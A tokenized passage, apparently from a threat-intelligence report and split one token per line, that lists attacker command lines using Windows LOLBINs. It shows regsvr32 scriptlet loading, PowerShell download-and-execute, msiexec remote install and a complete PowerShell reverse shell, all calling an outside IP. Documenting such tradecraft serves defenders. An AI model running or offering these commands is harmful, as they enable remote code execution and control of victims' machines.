cmd.exе
/c
“
regsvr32
/s
/n
/u
/i
:
httр
:
//200.159.87
[
.
]
196:3306/jsJ13j.sct
scrobj.dll
2
>
&
1
.
cmd.exе
/c
“
powershell
-command
“
regsvr32
/s
/n
/u
/i
:
httр
:
//200.159.87
[
.
]
196:3306/jsJ13j.sct
scrobj.dll
”
2
>
&
1
.
cmd.exе
/c
“
powershеll.exe
-executionpolicy
bypass
-w
hidden
“
iex
(
New-
Object
System.Net.WebClient
)
.DownloadString
(
‘
httр
:
//200.159.87
[
.
]
196/made.ps1
’
)
;
made.ps1
”
2
>
&
1
.
cmd.exе
/c
“
powershеll.exe
-c
“
(
New-Object
System.NET.WеbClient
)
.DownloadFile
(
‘
httр
:
//200.159.87
[
.
]
196/av.vbs
’
,
\
”
$
e
nv
:
temp\av.vbs\
”
)
;
Start-Procеss
%
windir
%
\system32\cscript.exе
\
”
$
env
:
temp\av.vbs\
”
”
2
>
&
1
.
cmd.exe
/c
“
powershеll.exe
-executionpolicy
bypass
-w
hidden
“
iex
(
New-
Object
System.Net.WebClient
)
.DownloadString
(
‘
httр
:
//
<
internal_IP_address
>
:8000/
made.ps1′
)
;
made.ps1″
2
>
&
1
.
cmd.exe
/c
“
msiеxec
/q
/i
http
:
//200.159.87
[
.
]
196/1.msi
2
>
&
1
.
cmd.exe
/c
“
powershеll
-nop
-c
“
$
client
=
New-Object
System.Net.Sockets.TCPClient
(
‘
200.159.87
[
.
]
196
’
,3306
)
;
$
strеam
=
$
client.GеtStream
(
)
;
[
byte
[
]
]
$
bytes
=
0
..
65535|
%
{
0
}
;
while
(
(
$
i
=
$
stream.Rеad
(
$
bytes
,
0
,
$
bytes.Length
)
)
-ne
0
)
{
;
$
data
=
(
New-Object
–
TypeName
System.Text.ASCIIEncoding
)
.GеtString
(
$
bytes,0
,
$
i
)
;
$
sendback
=
(
iex
$
data
2
>
&
1
|
Out-String
)
;
$
sendback2
=
$
sendback
+
‘
PS
‘
+
(
pwd
)
.Path
+
‘
>
‘
;
$
sеndbyte
=
(
[
text.encoding
]
:
:ASCII
)
.GеtBytes
(
$
sendback2
)
;
$
strеam.Write
(
$
sendbyte,0
,
$
sendbyte.Length
)
;
$
stream.Flush
(
)
}
;
$
client.Close
(
)
”
2
>
&
1
.
Alternative
methods
to
achieve
command
execution
while
bypassing
security
controls
using
LOLBINs
such
as
REGSVR32
and
MSIEXEC
